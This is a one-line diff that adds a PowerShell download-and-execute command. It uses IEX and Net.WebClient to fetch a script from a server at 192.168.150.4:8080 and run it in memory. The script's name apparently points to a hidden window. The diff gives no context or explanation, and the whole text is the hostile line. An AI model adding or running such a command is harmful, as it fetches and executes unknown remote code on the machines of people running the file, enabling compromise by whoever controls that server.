@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.150.4:8080/wind11_FT0k_HidWindw_WRKwithPyList.ps1')
